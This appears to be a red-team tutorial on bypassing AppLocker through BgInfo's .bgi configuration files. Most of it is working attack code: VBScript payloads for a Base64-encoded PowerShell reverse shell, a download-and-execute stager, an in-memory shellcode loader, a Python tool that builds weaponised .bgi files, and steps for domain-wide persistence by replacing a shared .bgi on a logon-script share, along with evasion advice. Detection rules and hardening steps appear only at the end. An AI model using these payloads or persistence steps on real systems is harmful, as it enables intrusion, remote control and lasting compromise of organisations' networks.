---
title: "AppLocker Bypass — BgInfo VBScript Execution"
date: 2026-03-06
description: "Abusing BgInfo's OLE .bgi configuration files to execute VBScript payloads under a Microsoft-signed binary, including GPO share persistence and Python tooling to generate weaponised .bgi files."
tags: ["applocker", "bypass", "bginfo", "vbscript", "ole", "persistence", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution), [T1547.001](https://attack.mitre.org/techniques/T1547/001/) (Registry Run Keys / Startup Folder — persistence variant), and [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer).

---

## Lab Setup

BgInfo is a Sysinternals utility that many enterprise environments deploy to stamp asset information on the desktop wallpaper. That deployment history is exactly what makes it useful on an engagement. It's often already present, and where it isn't, its Microsoft signature gets it through publisher-based AppLocker rules.

### VM Stack

``` {linenos=inline}
┌─────────────────────────────────────────────────────────┐
│                   Host Machine                          │
│  ┌──────────────────────┐   ┌────────────────────────┐  │
│  │  Windows 10/11 VM    │   │   Kali Linux VM        │  │
│  │  (Target)            │   │   (Attacker)           │  │
│  │                      │   │                        │  │
│  │  - AppLocker enabled │   │  - Python HTTP server  │  │
│  │  - BgInfo.exe present│   │  - nc / rlwrap         │  │
│  │  - Standard user     │   │  - pip install olefile │  │
│  │  - Sysmon installed  │   │                        │  │
│  │  - Audit logging on  │   │  192.168.56.101        │  │
│  │                      │   └────────────────────────┘  │
│  │  192.168.56.100      │                               │
│  └──────────────────────┘                               │
│              Host-only network: 192.168.56.0/24         │
└─────────────────────────────────────────────────────────┘
```

### Windows VM — BgInfo + AppLocker Configuration

```powershell {linenos=inline}
# 1. Download BgInfo from Microsoft Sysinternals
# https://learn.microsoft.com/en-us/sysinternals/downloads/bginfo
# Place in C:\Windows\ or C:\Program Files\Sysinternals\ (trusted paths)

# 2. Verify it's Microsoft-signed (key for publisher rule bypass)
Get-AuthenticodeSignature "C:\Windows\bginfo.exe" |
    Select-Object -ExpandProperty SignerCertificate |
    Select-Object Subject, Issuer
# Expected: Subject contains "Microsoft Corporation"

# 3. Enable AppLocker service
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc

# 4. Apply and enforce default executable rules
# gpedit.msc → Computer Configuration → Windows Settings →
#   Security Settings → Application Control Policies → AppLocker
# Right-click Executable Rules → Create Default Rules → Enforce

# 5. Confirm BgInfo is reachable as a standard user
# (it lives in C:\Windows\ — matches %WINDIR%\* rule)
Test-Path "C:\Windows\bginfo.exe"   # True
icacls "C:\Windows\bginfo.exe"      # confirm Users have Read+Execute

# 6. Create standard test user
$pw = ConvertTo-SecureString "Password1!" -AsPlainText -Force
New-LocalUser -Name "testuser" -Password $pw -FullName "Test User"
Add-LocalGroupMember -Group "Users" -Member "testuser"

# 7. Enable process creation + script block audit
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
Set-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging `
    -Name EnableScriptBlockLogging -Value 1

# 8. Verify BgInfo runs silently (baseline check)
C:\Windows\bginfo.exe /timer:0 /silent /nolicprompt
# Should apply default info to wallpaper with no UI shown
```

### Sysmon Configuration

```powershell
C:\Tools\Sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml

# Watch BgInfo-related events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Message -match "bginfo" } |
    Select-Object TimeCreated, Id, Message | Format-List
```

### Attacker VM (Kali) — Listener, Server, and .bgi Tools

```bash {linenos=inline}
# Listener for reverse shell
rlwrap nc -lvnp 4444

# HTTP server for payload delivery
mkdir -p ~/lab/bginfo && cd ~/lab/bginfo
python3 -m http.server 8080

# Install olefile for .bgi inspection and patching
pip3 install olefile

# Install compoundfiles (alternative OLE library)
pip3 install compoundfiles
```

### Creating a Baseline .bgi Template (Required for Python Generator)

``` {linenos=inline}
On the Windows VM (any session, admin not required):
1. Run: C:\Windows\bginfo.exe
2. Accept the license
3. Click "Fields" → "Custom..." → "New"
4. Name the field: "SysInfo"
5. In the VBScript box, enter the marker string:   __PAYLOAD_MARKER__
6. Click OK → OK
7. Click "Apply"
8. File → Save As → C:\Tools\template.bgi

This template is your base. The Python generator patches __PAYLOAD_MARKER__
with the real VBScript payload at generation time.
```

### Snapshot

```
Take a snapshot named "AppLocker-BgInfo-Clean" after all configuration.
Roll back between technique tests to preserve the baseline.
```

---

## Diagrams

### Execution Chain — Standard Flow

``` {linenos=inline}
Attacker crafts malicious .bgi on Kali
(VBScript payload embedded in OLE compound document)
        │
        ▼
.bgi delivered to target
  Option A: HTTP download → %TEMP%\update.bgi
  Option B: UNC path      → \\attacker\share\payload.bgi
  Option C: Pre-existing  → replace legitimate bginfo.bgi in startup
        │
        ▼
Standard user executes:
  bginfo.exe malicious.bgi /timer:0 /silent /nolicprompt
        │
        ▼
BgInfo.exe (Microsoft-signed, trusted path) loads the .bgi
  → Parses OLE compound document
  → Reads custom field definitions
  → Evaluates each field's VBScript via embedded scripting engine
        │
        ▼
VBScript payload executes INSIDE bginfo.exe process
  → WScript.Shell.Run() spawns payload subprocess
  → Or: ADODB.Stream downloads + saves next-stage binary
  → Or: PowerShell subprocess connects reverse shell
        │
        ▼
AppLocker evaluation:
  bginfo.exe → lives in %WINDIR%\* → ALLOWED (path rule)
  bginfo.exe → Microsoft-signed → ALLOWED (publisher rule)
  .bgi file  → not an executable → not evaluated
  VBScript   → runs in-process  → not evaluated
  powershell.exe (child) → System32 → ALLOWED
```

### AppLocker Coverage Gap

``` {linenos=inline}
┌──────────────────────────────┬──────────────┬───────────────────────────────┐
│  Component                   │  AppLocker   │  Notes                        │
│                              │  Checks It?  │                               │
├──────────────────────────────┼──────────────┼───────────────────────────────┤
│  bginfo.exe                  │  YES — ALLOW │  %WINDIR%\* path match        │
│  (C:\Windows\bginfo.exe)     │              │  + Microsoft publisher cert   │
├──────────────────────────────┼──────────────┼───────────────────────────────┤
│  malicious.bgi               │  NO          │  Not an executable;           │
│  (OLE config file)           │              │  AppLocker ignores data files │
├──────────────────────────────┼──────────────┼───────────────────────────────┤
│  VBScript in custom field    │  NO          │  Runs inside bginfo.exe;      │
│                              │              │  no process creation to check │
├──────────────────────────────┼──────────────┼───────────────────────────────┤
│  powershell.exe (spawned)    │  YES — ALLOW │  C:\Windows\System32\         │
│                              │              │  matches default path rule    │
├──────────────────────────────┼──────────────┼───────────────────────────────┤
│  Inline PS script content    │  NO          │  Unless Script Rules enabled  │
│  (passed via -EncodedCommand)│              │  (they're off by default)     │
└──────────────────────────────┴──────────────┴───────────────────────────────┘

Bypass summary: trusted binary (bginfo.exe) loads a data file (.bgi) that
                contains executable logic. AppLocker evaluates the loader,
                not the content it processes.
```

### BgInfo .bgi File — OLE Structure

``` {linenos=inline}
malicious.bgi  (OLE2 Compound File Binary Format)
│
├── Root Entry  (directory)
│   │
│   ├── BgInfo Stream  ← primary config data
│   │     │
│   │     ├── Display settings (font, colors, position)
│   │     ├── Built-in field selections
│   │     └── Custom field definitions
│   │           │
│   │           └── VBScript expression ← ATTACK SURFACE
│   │                  "Set s=CreateObject(""WScript.Shell""):s.Run ..."
│   │
│   └── [Additional streams: thumbnail, preview, etc.]
│
└── .bgi is read by bginfo.exe; Windows never executes it directly
    → AppLocker has no hook on data file consumption

OLE format == same container as old .doc / .xls files
Tools: olefile (Python), SSView (Windows), strings (quick peek)
```

### Persistence Flow — GPO / Startup Hijack

``` {linenos=inline}
Enterprise BgInfo Deployment (typical):
  GPO Logon Script: bginfo.exe \\fileserver\it\bginfo\company.bgi /timer:0 /silent /nolicprompt
                                        │
                                        └── company.bgi → legitimate wallpaper config

Attacker gains write access to \\fileserver\it\bginfo\  (common misconfiguration)
        │
        ▼
Replace company.bgi with weaponized version (same filename)
        │
        ▼
Every user logon in the domain:
  GPO fires → bginfo.exe \\fileserver\it\bginfo\company.bgi
            → VBScript in evil .bgi executes
            → Reverse shell / beacon connects back
            → User sees normal wallpaper (add legit fields too)

Domain-wide persistence with no binaries planted and no registry changes.
Cleanup: restore original company.bgi
```

---

## The Core Idea

BgInfo reads configuration from `.bgi` files, OLE2 compound documents (the same container format as old Word and Excel files). Inside, it evaluates **custom field** definitions written in VBScript to collect system information and display it on the desktop wallpaper.

That VBScript execution is the bypass. You can write any valid VBScript into a custom field. BgInfo will evaluate it during its information-gathering pass, entirely inside its own process, before AppLocker ever gets involved. Use `WScript.Shell.Run()` to spawn a subprocess, `ADODB.Stream` to download files, or chain into a PowerShell one-liner for a full reverse shell.

The trust chain has three layers working in your favor:
1. **Path trust** — `bginfo.exe` lives in `C:\Windows\`, covered by `%WINDIR%\*`.
2. **Publisher trust** — BgInfo is signed by Microsoft Corporation; publisher rules let it through automatically.
3. **Data file gap** — The `.bgi` file is a configuration file, not an executable. AppLocker doesn't evaluate configuration files.

In environments where BgInfo is already deployed at logon via GPO, this becomes persistence. Replace the shared `.bgi` file and every user logon delivers a shell.

---

## VBScript Payload 1 — Calc PoC

The baseline confirmation. Drop this into the custom field to verify the VBScript is executing before moving to a real payload.

**`payload_calc.vbs`** (the VBScript content — goes into the custom field)

```vbscript
Set shell = CreateObject("WScript.Shell")
shell.Run "calc.exe", 0, False
```

---

## VBScript Payload 2 — PowerShell Reverse Shell

VBScript constructs and fires a PowerShell reverse shell one-liner. The PS command is passed as a Base64-encoded `-EncodedCommand` to dodge naive string detection.

**`payload_revshell.vbs`**

```vbscript {linenos=inline}
Dim host, port, cmd
host = "192.168.56.101"
port = "4444"

' Build the PowerShell TCP reverse shell
Dim ps
ps = "$c=New-Object Net.Sockets.TCPClient('" & host & "'," & port & ");" & _
     "$s=$c.GetStream();" & _
     "[byte[]]$b=0..65535|%{0};" & _
     "while(($i=$s.Read($b,0,$b.Length)) -ne 0){" & _
     "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" & _
     "$r=(iex $d 2>&1|Out-String);" & _
     "$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)}"

' Base64-encode for clean delivery (UTF-16LE — what PS expects)
Dim xmldom
Set xmldom = CreateObject("MSXML2.DOMDocument")
Dim elem
Set elem = xmldom.createElement("b64")
elem.dataType = "bin.base64"

' Encode UTF-16LE bytes
Dim bytes()
ReDim bytes(Len(ps) * 2 - 1)
Dim i
For i = 1 To Len(ps)
    bytes((i-1)*2)   = Asc(Mid(ps, i, 1))
    bytes((i-1)*2+1) = 0
Next
elem.nodeTypedValue = bytes
Dim b64
b64 = Replace(Replace(elem.text, Chr(10), ""), Chr(13), "")

' Fire it
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -nop -w hidden -enc " & b64, 0, False
```

**Listener on Kali:**

```bash
rlwrap nc -lvnp 4444
```

---

## VBScript Payload 3 — Download and Execute

Pulls a next-stage binary from the attacker's HTTP server, saves it to `%TEMP%`, and executes it. No PowerShell involved, just pure COM objects available in any VBScript context.

**`payload_dnx.vbs`**

```vbscript {linenos=inline}
Dim url, savePath
url      = "http://192.168.56.101:8080/payload.exe"
savePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\svcupdate.exe"

' Download binary
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

' Write to disk
Dim stream
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1    ' adTypeBinary
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile savePath, 2    ' adSaveCreateOverWrite
stream.Close

' Execute, hidden window
CreateObject("WScript.Shell").Run savePath, 0, False
```

**Serve the payload on Kali:**

```bash
cp /path/to/payload.exe ~/lab/bginfo/payload.exe
python3 -m http.server 8080
```

---

## VBScript Payload 4 — Shellcode via PowerShell Inline Loader

For when you want your shellcode running inside a more controlled process. BgInfo's VBScript spawns a PowerShell that allocates memory, copies shellcode, and executes. PowerShell is trusted; AppLocker evaluates `powershell.exe` (allowed) and ignores the inline byte array.

**`payload_shellcode.vbs`**

```vbscript {linenos=inline}
' Generate shellcode bytes with:
' msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f ps1
' Paste the $buf = [byte[]](0x...) output into the PS block below.

Dim psBlock
psBlock = "$b=[byte[]](0xfc,0x48,0x83,0xe4,0xf0); " & _
          "# ^^^ Replace with real msfvenom -f ps1 output ^^^ " & _
          "$m=[System.Runtime.InteropServices.Marshal];" & _
          "$p=$m::AllocHGlobal($b.Length);" & _
          "$m::Copy($b,0,$p,$b.Length);" & _
          "Add-Type -MemberDefinition '[DllImport(""kernel32"")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport(""kernel32"")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(""kernel32"")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);' -Name W -Namespace K;" & _
          "$mem=[K.W]::VirtualAlloc([IntPtr]::Zero,[uint]$b.Length,0x3000,0x40);" & _
          "$m::Copy($b,0,$mem,$b.Length);" & _
          "$t=[K.W]::CreateThread([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero);" & _
          "[K.W]::WaitForSingleObject($t,0xFFFFFFFF)|Out-Null"

Dim xmldom
Set xmldom = CreateObject("MSXML2.DOMDocument")
Dim elem
Set elem = xmldom.createElement("b64")
elem.dataType = "bin.base64"

Dim bytes()
ReDim bytes(Len(psBlock) * 2 - 1)
Dim i
For i = 1 To Len(psBlock)
    bytes((i-1)*2)   = Asc(Mid(psBlock, i, 1))
    bytes((i-1)*2+1) = 0
Next
elem.nodeTypedValue = bytes
Dim b64
b64 = Replace(Replace(elem.text, Chr(10), ""), Chr(13), "")

CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & b64, 0, False
```

---

## Building the Malicious .bgi File

`.bgi` files are OLE2 compound documents. The cleanest approach is to create a template file using BgInfo's own UI, then patch in the real VBScript payload programmatically.

### Step 1 — Create a Template with BgInfo UI

```
1. Run bginfo.exe on any Windows machine (admin not required)
2. Accept the EULA
3. Click "Custom..." (bottom-left) → "New"
4. Field name: "SysInfo"
5. In the VBScript expression box, type exactly:
       __PAYLOAD_MARKER__
6. Click OK → OK
7. File → Save As → template.bgi
8. Transfer template.bgi to your Kali machine
```

### Step 2 — Inspect the Template (Optional but Recommended)

**`bginfo_inspect.py`**

```python {linenos=inline}
#!/usr/bin/env python3
"""
bginfo_inspect.py — Inspect stream structure of a .bgi OLE compound document.
Usage: python3 bginfo_inspect.py template.bgi
Dependency: pip install olefile
"""

import sys
import olefile

def inspect_bgi(path: str) -> None:
    if not olefile.isOleFile(path):
        print(f"[-] {path} is not an OLE compound file")
        sys.exit(1)

    with olefile.OleFileIO(path) as ole:
        print(f"[*] OLE streams in: {path}")
        print("-" * 50)
        for entry in ole.direntries:
            if entry is None:
                continue
            # entry_type: 0=empty, 1=storage, 2=stream, 5=root
            type_map = {0: "empty", 1: "storage", 2: "stream", 5: "root"}
            etype = type_map.get(entry.entry_type, "?")
            size  = entry.size if entry.entry_type == 2 else "-"
            print(f"  [{etype:8s}] {entry.name:<30s} size={size}")

        print()
        print("[*] Stream contents (hex + ASCII):")
        print("-" * 50)
        for entry in ole.direntries:
            if entry is None or entry.entry_type != 2:
                continue
            try:
                # Build stream path — olefile uses list notation
                stream_path = entry.name
                data = ole.openstream(stream_path).read()
                print(f"\n--- Stream: {entry.name} ({len(data)} bytes) ---")
                # Hex dump first 256 bytes
                for i in range(0, min(256, len(data)), 16):
                    chunk = data[i:i+16]
                    hex_part = " ".join(f"{b:02x}" for b in chunk)
                    asc_part = "".join(chr(b) if 0x20 <= b < 0x7f else "." for b in chunk)
                    print(f"  {i:04x}  {hex_part:<48s}  {asc_part}")
                # Search for marker string (UTF-16LE and ASCII)
                marker_ascii  = b"__PAYLOAD_MARKER__"
                marker_utf16  = "__PAYLOAD_MARKER__".encode("utf-16-le")
                if marker_ascii in data:
                    print(f"  [!] ASCII marker found at offset {data.index(marker_ascii)}")
                if marker_utf16 in data:
                    print(f"  [!] UTF-16LE marker found at offset {data.index(marker_utf16)}")
            except Exception as e:
                print(f"  [!] Could not read stream {entry.name}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <file.bgi>")
        sys.exit(1)
    inspect_bgi(sys.argv[1])
```

### Step 3 — Patch the Payload In

**`bginfo_gen.py`**

```python {linenos=inline}
#!/usr/bin/env python3
"""
bginfo_gen.py — Patch a .bgi template with a malicious VBScript payload.

Usage:
  python3 bginfo_gen.py -t template.bgi -p payload_revshell.vbs -o evil.bgi
  python3 bginfo_gen.py -t template.bgi -s 'CreateObject("WScript.Shell").Run "calc.exe",0,False' -o evil.bgi

Dependencies: pip install olefile
"""

import sys
import os
import shutil
import argparse
import olefile

MARKER_ASCII = b"__PAYLOAD_MARKER__"
MARKER_UTF16 = "__PAYLOAD_MARKER__".encode("utf-16-le")


def load_payload(args) -> str:
    if args.script:
        return args.script
    if args.payload:
        with open(args.payload, "r") as f:
            return f.read().strip()
    print("[-] Provide --script or --payload")
    sys.exit(1)


def patch_stream_data(data: bytes, payload: str) -> tuple[bytes, int]:
    """Replace marker string (ASCII or UTF-16LE) with payload. Returns (patched_data, patch_count)."""
    count = 0

    # Try ASCII replacement
    if MARKER_ASCII in data:
        data  = data.replace(MARKER_ASCII, payload.encode("ascii", errors="replace"))
        count += data.count(payload.encode("ascii", errors="replace"))

    # Try UTF-16LE replacement
    if MARKER_UTF16 in data:
        data  = data.replace(MARKER_UTF16, payload.encode("utf-16-le"))
        count += 1

    return data, count


def patch_bgi(template: str, output: str, payload: str) -> None:
    if not olefile.isOleFile(template):
        print(f"[-] {template} is not a valid OLE/BgInfo file")
        sys.exit(1)

    # Work on a copy
    shutil.copy2(template, output)

    patched_any = False

    with olefile.OleFileIO(output, write_mode=True) as ole:
        for entry in ole.direntries:
            if entry is None or entry.entry_type != 2:
                continue
            try:
                data = ole.openstream(entry.name).read()
                new_data, count = patch_stream_data(data, payload)
                if count > 0:
                    ole.write_stream(entry.name, new_data)
                    print(f"[+] Patched stream '{entry.name}' ({count} replacement(s))")
                    patched_any = True
            except Exception as e:
                print(f"[!] Could not process stream '{entry.name}': {e}")

    if patched_any:
        size = os.path.getsize(output)
        print(f"[+] Written: {output} ({size} bytes)")
    else:
        print("[-] Marker not found in any stream.")
        print("    Run bginfo_inspect.py first to confirm marker placement.")
        os.remove(output)
        sys.exit(1)


def main():
    ap = argparse.ArgumentParser(description="BgInfo .bgi payload patcher")
    ap.add_argument("-t", "--template", required=True, help="Path to template .bgi")
    ap.add_argument("-o", "--output",   required=True, help="Output path for weaponized .bgi")
    ap.add_argument("-p", "--payload",  help="Path to .vbs file containing VBScript payload")
    ap.add_argument("-s", "--script",   help="Inline VBScript string (single line)")
    args = ap.parse_args()

    payload = load_payload(args)
    print(f"[*] Template : {args.template}")
    print(f"[*] Output   : {args.output}")
    print(f"[*] Payload  : {len(payload)} chars")
    patch_bgi(args.template, args.output, payload)


if __name__ == "__main__":
    main()
```

**Usage:**

```bash
# Patch with a .vbs file
python3 bginfo_gen.py -t template.bgi -p payload_revshell.vbs -o evil.bgi

# Patch with an inline one-liner
python3 bginfo_gen.py -t template.bgi \
    -s 'CreateObject("WScript.Shell").Run "calc.exe",0,False' \
    -o evil_calc.bgi

# Inspect before patching (recommended first run)
python3 bginfo_inspect.py template.bgi
```

---

## Execution

### Basic Execution (Standard User, No Prompts)

```cmd
:: Local .bgi
C:\Windows\bginfo.exe evil.bgi /timer:0 /silent /nolicprompt

:: From UNC path (no local disk write of the .bgi)
C:\Windows\bginfo.exe \\192.168.56.101\share\evil.bgi /timer:0 /silent /nolicprompt
```

### Flag Reference

| Flag | Effect |
|------|--------|
| `/timer:0` | Apply immediately — skip the countdown dialog |
| `/silent` | No error message boxes — failures die quietly |
| `/nolicprompt` | Skip the EULA dialog |
| `/log filename` | Write errors to file instead of showing dialogs |
| `/all` | Apply wallpaper to all monitors |

Combine `/timer:0 /silent /nolicprompt` on every invocation. Without them, BgInfo pops a dialog and waits.

### PowerShell Wrapper (One-Liner Stager)

```powershell
# Download .bgi, execute, then delete
$b = "$env:TEMP\sys.bgi"
(New-Object Net.WebClient).DownloadFile("http://192.168.56.101:8080/evil.bgi", $b)
& "C:\Windows\bginfo.exe" $b /timer:0 /silent /nolicprompt
Remove-Item $b -Force
```

### Direct UNC Execution (Nothing Written to Target Disk)

```bash
# On Kali — share the .bgi over SMB
impacket-smbserver share ~/lab/bginfo -smb2support
```

```cmd
:: On target — execute straight from the share
C:\Windows\bginfo.exe \\192.168.56.101\share\evil.bgi /timer:0 /silent /nolicprompt
```

---

## Persistence — Hijacking an Existing BgInfo Deployment

This is the high-value variant. Most enterprise BgInfo deployments follow the same pattern: a GPO logon script runs BgInfo against a shared `.bgi` file on a network share. If that share has weak ACLs, you own every logon in scope.

### Find the Existing Deployment

```powershell {linenos=inline}
# Look for BgInfo in GPO scripts
Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Filter "*.bgi" -ErrorAction SilentlyContinue

# Check startup/logon script registry keys
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" |
    Select-Object * | Where-Object { $_ -match "bginfo" }

Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" |
    Select-Object * | Where-Object { $_ -match "bginfo" }

# Check Scheduled Tasks
Get-ScheduledTask | Where-Object { $_.Actions.Execute -match "bginfo" } |
    Select-Object TaskName, @{n="Action"; e={ $_.Actions.Execute }},
                            @{n="Args";   e={ $_.Actions.Arguments }}

# Check Group Policy Logon Scripts (requires access to SYSVOL)
Get-ChildItem "\\$env:LOGONSERVER\SYSVOL\$env:USERDNSDOMAIN\scripts\" -ErrorAction SilentlyContinue |
    Select-Object Name, FullName
```

### Check ACLs on the .bgi Share

```powershell {linenos=inline}
# Get share path from GPO / registry / task — e.g. \\fileserver\it\bginfo\
$sharePath = "\\fileserver\it\bginfo"

# Check if current user can write to it
$acl = Get-Acl $sharePath
$acl.Access | Where-Object {
    $_.FileSystemRights -match "Write|FullControl|Modify" -and
    ($_.IdentityReference -match $env:USERNAME -or
     $_.IdentityReference -match "Everyone" -or
     $_.IdentityReference -match "Authenticated Users" -or
     $_.IdentityReference -match "Users")
}

# Quick write-access test
$testFile = "$sharePath\writetest_$(Get-Random).tmp"
try {
    [IO.File]::WriteAllText($testFile, "test")
    Remove-Item $testFile
    Write-Host "[+] Write access confirmed: $sharePath" -ForegroundColor Green
} catch {
    Write-Host "[-] No write access to $sharePath" -ForegroundColor Red
}
```

### Weaponize the Shared .bgi

```bash {linenos=inline}
# On Kali: patch the legitimate .bgi with your payload
# First copy the real one to inspect it, then patch

# Option A: patch the downloaded original
smbclient //fileserver/it -U "DOMAIN\user%pass" -c "get bginfo\company.bgi company.bgi"
python3 bginfo_inspect.py company.bgi   # find where VBScript goes
# Add a new custom field to the OLE or patch an existing one

# Option B: generate from your template and rename it to match the original
python3 bginfo_gen.py -t template.bgi -p payload_revshell.vbs -o company.bgi

# Upload back to the share
smbclient //fileserver/it -U "DOMAIN\user%pass" -c "put company.bgi bginfo\company.bgi"
```

---

## Operational Notes

**Standard user can execute bginfo.exe without elevation.** AppLocker allows it, the binary has no elevation manifest, and `/timer:0 /silent /nolicprompt` means no UI surface for the user to interact with. Clean from a visibility standpoint.

**The wallpaper will change.** BgInfo updates the desktop background when it runs. Unless you include the same fields as the legitimate config, the wallpaper will look wrong. Add the real display fields to your VBScript payload or preserve them from the original `.bgi` template.

**Avoid alerting on wallpaper anomalies.** In environments where BgInfo is legitimately deployed, users and helpdesk will notice if the wallpaper info changes or disappears. Use the persistence variant with a copy of the legitimate `.bgi` plus your extra hidden custom field. The malicious field doesn't have to display anything. Custom fields can be evaluated but not placed on the wallpaper.

**A hidden custom field:** In BgInfo's field editor, create a custom field with your VBScript but don't add it to the layout text. It evaluates during the info-gathering pass but outputs nothing to the wallpaper. This is the cleaner persistence approach.

**bginfo.exe location matters.** If BgInfo isn't pre-deployed in a trusted path, you need to drop it in one. `C:\Windows\` is the cleanest choice, as it's covered by the default path rule and doesn't look unusual. Alternatively, if the environment uses Microsoft publisher rules, bginfo.exe passes from anywhere because it's Microsoft-signed.

**Child process visibility.** `WScript.Shell.Run` with window style `0` creates a hidden child process, but Sysmon Event ID 1 will still record it with bginfo.exe as parent. The parent-child chain `bginfo.exe → powershell.exe` is anomalous and worth suppressing if possible. Use the encoded command approach to avoid obvious PowerShell strings in the command line.

---

## Detection and Blue Team

### What to Hunt

BgInfo running with a path to a `.bgi` file is the baseline event. The threat indicators are:
- BgInfo running from unexpected locations (not startup/logon)
- BgInfo making network connections
- BgInfo spawning cmd.exe or powershell.exe
- `.bgi` files appearing in user-writable paths (`%TEMP%`, `%APPDATA%`, network shares)

**Sysmon Event ID 1 — Anomalous Invocations:**

```xml
<RuleGroup name="BgInfo-Exec" groupRelation="or">
    <ProcessCreate onmatch="include">
        <!-- Flag bginfo spawning a shell -->
        <ParentImage condition="end with">bginfo.exe</ParentImage>
        <!-- Flag bginfo executing from a UNC path -->
        <CommandLine condition="contains">bginfo.exe</CommandLine>
        <CommandLine condition="contains">\\</CommandLine>
    </ProcessCreate>
</RuleGroup>
```

**Sysmon Event ID 3 — Network Connections from BgInfo:**

```xml
<RuleGroup name="BgInfo-Network" groupRelation="or">
    <NetworkConnect onmatch="include">
        <Image condition="end with">bginfo.exe</Image>
    </NetworkConnect>
</RuleGroup>
```

**Sysmon Event ID 11 — .bgi Files Created in Unusual Paths:**

```xml
<RuleGroup name="BgInfo-FileCreate" groupRelation="or">
    <FileCreate onmatch="include">
        <TargetFilename condition="end with">.bgi</TargetFilename>
    </FileCreate>
</RuleGroup>
```

### Detection Signatures Summary

| Signal | Event ID | Fidelity |
|--------|----------|----------|
| bginfo.exe → powershell.exe parent-child | Sysmon 1 | High |
| bginfo.exe making outbound TCP connection | Sysmon 3 | Very high |
| bginfo.exe running outside logon/startup context | Sysmon 1 | Medium |
| .bgi file appearing in `%TEMP%` or `%APPDATA%` | Sysmon 11 | Medium |
| bginfo.exe with UNC path argument | Sysmon 1 | Medium |
| Network share .bgi file modification (off baseline) | File audit | High |

### Windows Event Log Hunt (PowerShell)

```powershell {linenos=inline}
# Find bginfo process creation events
Get-WinEvent -LogName Security |
    Where-Object { $_.Id -eq 4688 -and $_.Message -match "bginfo" } |
    Select-Object TimeCreated,
        @{n="User";    e={ $_.Properties[1].Value }},
        @{n="Process"; e={ $_.Properties[5].Value }},
        @{n="CmdLine"; e={ $_.Properties[8].Value }} |
    Format-Table -AutoSize

# Look for child processes of bginfo
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "bginfo" } |
    Select-Object TimeCreated, Message | Format-List

# Check for .bgi file modifications on sensitive shares (requires file auditing)
Get-WinEvent -LogName Security |
    Where-Object { $_.Id -eq 4663 -and $_.Message -match "\.bgi" } |
    Format-List
```

### SIGMA Rule

```yaml {linenos=inline}
title: BgInfo Spawning Shell or Network Connection
id: a3c7f1e2-9b84-4d2a-b5c6-1e8f3a72d091
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection_parent:
        ParentImage|endswith: '\bginfo.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\cscript.exe'
    condition: selection_parent
falsepositives:
    - Legitimate BgInfo deployments that shell out for information gathering
      (rare; review and whitelist if confirmed benign)
level: high
tags:
    - attack.defense_evasion
    - attack.t1218

---
title: BgInfo Network Connection
status: experimental
logsource:
    product: windows
    category: network_connection
detection:
    selection:
        Image|endswith: '\bginfo.exe'
        Initiated: 'true'
    condition: selection
falsepositives:
    - None known for outbound TCP connections
level: critical
tags:
    - attack.execution
    - attack.t1218
```

### MDE KQL Query

```kusto {linenos=inline}
// BgInfo spawning child processes
DeviceProcessEvents
| where InitiatingProcessFileName =~ "bginfo.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe")
| project Timestamp, DeviceName, AccountName,
          FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

// BgInfo network connections
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "bginfo.exe"
| where ActionType == "ConnectionSuccess"
| project Timestamp, DeviceName, AccountName,
          RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessCommandLine
| order by Timestamp desc
```

---

## Defensive Recommendations

**Inventory and lock down the shared .bgi file:**

```powershell {linenos=inline}
# Audit write permissions on the BgInfo share
$sharePath = "\\fileserver\it\bginfo"
(Get-Acl $sharePath).Access |
    Where-Object { $_.FileSystemRights -match "Write|FullControl|Modify" } |
    Select-Object IdentityReference, FileSystemRights, AccessControlType |
    Format-Table -AutoSize

# Restrict to IT admin accounts only — remove Users / Authenticated Users write
$acl = Get-Acl $sharePath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Authenticated Users", "Write", "Deny")
$acl.AddAccessRule($rule)
Set-Acl $sharePath $acl
```

**Block bginfo.exe via AppLocker Deny Rule if not in use:**

```powershell
# Add a deny rule in gpedit.msc:
# AppLocker → Executable Rules → New Deny Rule → Path
# Path: C:\*\bginfo.exe  (catches any location)
# Apply to: Users group (preserve admin access if needed)
```

**Enable AppLocker Script Rules to catch VBScript execution:**

```powershell
# gpedit.msc → AppLocker → Script Rules → Create Default Rules → Enforce
# This adds a policy layer that evaluates .vbs, .js, .wsf execution
